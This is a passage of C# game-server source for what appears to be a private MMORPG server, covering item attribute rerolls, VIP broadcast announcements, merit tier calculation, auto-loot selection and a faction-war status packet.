						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠内甲传说属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠内甲传说属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		private void 至尊viP公告()
		{
			try
			{
				if (!PublicState(1008000312) || World.八彩提示是否开启 != 1)
				{
					return;
				}
				查会员数据();
				系统提示("恭喜至尊viP玩家到期时间为", 10, "至尊viP");
				系统提示("[" + base.FLD_VIPTIM.ToString("yyyy年MM月dd日 hh时mm分") + "]", 10, "至尊viP");
				string[] array = World.八彩红色提示内容.Split(';');
				string[] array2 = World.八彩赤色提示内容.Split(';');
				string[] array3 = World.八彩橙色提示内容.Split(';');
				string[] array4 = World.八彩绿色提示内容.Split(';');
				string[] array5 = World.八彩蓝色提示内容.Split(';');
				string[] array6 = World.八彩深蓝提示内容.Split(';');
				string[] array7 = World.八彩紫色提示内容.Split(';');
				string[] array8 = World.八彩浅色提示内容.Split(';');
				foreach (Players value5 in World.AllConnectedPlayers.Values)
				{
					string text2 = string.Format(array[0], base.UserName);
					string text3 = string.Format(array2[0], base.UserName);
					string text4 = string.Format(array3[0], base.UserName);
					string text5 = string.Format(array4[0], base.UserName);
					string text6 = string.Format(array5[0], base.UserName);
					string text7 = string.Format(array6[0], base.UserName);
					string text8 = string.Format(array7[0], base.UserName);
					string text9 = string.Format(array8[0], base.UserName);
					value5.系统提示(text2 ?? "", 20, array[1] ?? "");
					value5.系统提示(text3 ?? "", 21, array2[1] ?? "");
					value5.系统提示(text4 ?? "", 22, array3[1] ?? "");
					value5.系统提示(text5 ?? "", 23, array4[1] ?? "");
					value5.系统提示(text6 ?? "", 24, array5[1] ?? "");
					value5.系统提示(text7 ?? "", 25, array6[1] ?? "");
					value5.系统提示(text8 ?? "", 26, array7[1] ?? "");
					value5.系统提示(text9 ?? "", 3, array8[1] ?? "");
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "至尊七彩出错 [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public bool PublicState(int Key)
		{
			公有药品类 value;
			return 公有药品 != null && 公有药品.Count > 0 && 公有药品.TryGetValue(Key, out value);
		}

		public void 计算人物武勋阶段()
		{
			try
			{
				if ((double)base.Player_WuXun >= World.Wxlever[8].武勋点)
				{
					base.武勋阶段 = 9;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[7].武勋点)
				{
					base.武勋阶段 = 8;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[6].武勋点)
				{
					base.武勋阶段 = 7;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[5].武勋点)
				{
					base.武勋阶段 = 6;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[4].武勋点)
				{
					base.武勋阶段 = 5;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[3].武勋点)
				{
					base.武勋阶段 = 4;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[2].武勋点)
				{
					base.武勋阶段 = 3;
				}
				else if ((double)base.Player_WuXun >= World.Wxlever[1].武勋点)
				{
					base.武勋阶段 = 2;
				}
				else
				{
					base.武勋阶段 = 1;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "更新武勋出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public long 获取自动拾取物品()
		{
			long result = 0L;
			List<地面物品类> list = new List<地面物品类>();
			Random random = new Random();
			foreach (地面物品类 value in World.ItemTemp.Values)
			{
				try
				{
					if (查找范围地面物品(300, value) && value.物品优先权 != null && value.物品优先权.UserName == base.UserName)
					{
						list.Add(value);
					}
				}
				catch (Exception)
				{
					throw;
				}
			}
			if (list.Count > 0)
			{
				int index = random.Next(0, list.Count);
				result = list[index].物品.Get物品全局ID;
				list.Clear();
				return result;
			}
			list.Clear();
			return result;
		}

		public void 积分属性加成()
		{
			try
			{
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(2, "积分提示数据出错--" + ex.Message);
			}
		}

		public void 游戏基本命令()
		{
		}

		public void 查会员数据()
		{
			DataTable dataTable = RxjhClass.得到帐号数据(base.Userid);
			if (dataTable == null && base.Client != null)
			{
				kickidlog("查会员出错()");
				OpClient(1);
				base.Client.Dispose();
			}
			base.FLD_VIP = (int)dataTable.Rows[0]["FLD_VIP"];
			base.FLD_VIPTIM = DateTime.Parse(dataTable.Rows[0]["FLD_VIPTIM"].ToString());
			dataTable.Dispose();
		}

		public void 发送势力战系统封包(int 进程, int 窗口)
		{
			string hex = "AA552F00010F2713222000010001000B00000001000000030000000500000005000000620F000000000000000000000000BD8455AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 5, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(进程), 0, array, 11, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(窗口), 0, array, 23, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(World.势力战正分数), 0, array, 27, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(World.势力战邪分数), 0, array, 31, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(World.势力战正人数), 0, array, 35, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(World.势力战邪人数), 0, array, 39, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}
	}
}
